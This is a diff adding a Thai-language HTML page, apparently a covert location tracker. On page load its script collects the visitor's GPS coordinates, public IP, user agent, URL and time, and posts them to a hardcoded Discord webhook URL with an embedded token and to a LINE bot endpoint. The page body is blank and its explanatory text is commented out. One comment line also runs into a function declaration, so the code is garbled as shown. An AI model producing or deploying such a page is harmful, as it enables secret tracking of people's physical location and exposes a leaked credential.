@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Tracker</title>
+    <script>
+        const ENABLE_DISCORD = true;
+        const ENABLE_LINE = true; // เปิดใช้งานส่งข้อมูลไป LINE
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz';
+        const LINE_ACCESS_TOKEN = 'YOUR_LINE_ACCESS_TOKEN_HERE'; // ใส่ LINE Access Token ที่ได้รับfunction sendLocationToDiscord({ latitude, longitude, ipAddress, userAgent, currentTime, currentUrl }) {
+        if (!ENABLE_DISCORD) {
+            console.log("การส่งข้อมูลไปยัง Discord ถูกปิดใช้งาน");
+            return;
+        }
+
+        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const embed = {
+            embeds: [
+                {
+                    title: "ข้อมูลตำแหน่ง",
+                    description: "รายละเอียดตำแหน่งที่ได้รับ",
+                    color: 7506394,
+                    fields: [
+                        { name: "🌍 ตำแหน่ง (Latitude, Longitude)", value: `${latitude}, ${longitude}`, inline: true },
+                        { name: "📍 ดูตำแหน่งบน Google Maps", value: `[เปิดใน Google Maps](${mapsUrl})`, inline: false },
+                        { name: "🌐 IP Address", value: ipAddress, inline: true },
+                        { name: "🔗 URL ที่ใช้งานอยู่", value: currentUrl, inline: false },
+                        { name: "📱 User-Agent", value: userAgent, inline: false },
+                        { name: "⏰ เวลาปัจจุบัน", value: currentTime, inline: false }
+                    ],
+                    footer: { text: "ส่งโดย GPS Bot" }
+                }
+            ]
+        };
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(embed)
+        }).then(response => {
+            if (response.ok) {
+                console.log("ข้อมูลถูกส่งไปที่ Discord");
+            } else {
+                console.log("ไม่สามารถส่งข้อมูลไปที่ Discord");
+            }
+        }).catch(error => {
+            console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
+        });
+    }
+
+    function sendLocationToLine({ latitude, longitude, ipAddress, userAgent, currentTime, currentUrl }) {
+        if (!ENABLE_LINE) {
+            console.log("การส่งข้อมูลไปยัง LINE ถูกปิดใช้งาน");
+            return;
+        }
+
+        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const message = `
+
+🌍 ตำแหน่ง (Latitude, Longitude): ${latitude}, ${longitude} 📍 ดูตำแหน่งบน Google Maps: ${mapsUrl} 🌐 IP Address: ${ipAddress} 🔗 URL ที่ใช้งานอยู่: ${currentUrl} 📱 User-Agent: ${userAgent} ⏰ เวลาปัจจุบัน: ${currentTime} `;
+
+fetch('https://api.line.me/v2/bot/message/push', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${LINE_ACCESS_TOKEN}`
+            },
+            body: JSON.stringify({
+                to: "YOUR_USER_ID", // ใส่ User ID ของผู้รับ (อาจดึงจากฐานข้อมูล)
+                messages: [{ type: "text", text: message }]
+            })
+        }).then(response => {
+            if (response.ok) {
+                console.log("ข้อมูลถูกส่งไปที่ LINE");
+            } else {
+                console.log("ไม่สามารถส่งข้อมูลไปที่ LINE");
+            }
+        }).catch(error => {
+            console.error("เกิดข้อผิดพลาดในการส่งข้อมูลไปยัง LINE:", error);
+        });
+    }
+
+    async function getLocationAndSend() {
+        try {
+            const [ipResponse, position] = await Promise.all([
+                fetch('https://api.ipify.org?format=json').then(res => res.json()),
+                new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                })
+            ]);
+
+            const ipAddress = ipResponse.ip;
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const userAgent = navigator.userAgent;
+            const currentTime = new Date().toLocaleDateString('th-TH') + ' ' + new Date().toLocaleTimeString('th-TH');
+            const currentUrl = window.location.href;
+
+            // ส่งข้อมูลไปที่ Discord และ LINE
+            sendLocationToDiscord({ latitude, longitude, ipAddress, userAgent, currentTime, currentUrl });
+            sendLocationToLine({ latitude, longitude, ipAddress, userAgent, currentTime, currentUrl });
+        } catch (error) {
+            console.error("เกิดข้อผิดพลาด:", error);
+        }
+    }
+
+    window.onload = getLocationAndSend;
+</script>
+
+</head>
+<body>
+    <!-- <h1>GPS Geolocation Tracker</h1>
+    <p>ข้อมูลตำแหน่ง IP, URL และเวลาจะถูกส่งไปที่ Discord และ LINE เมื่อโหลดหน้าเว็บ</p> -->
+</body>
+</html>
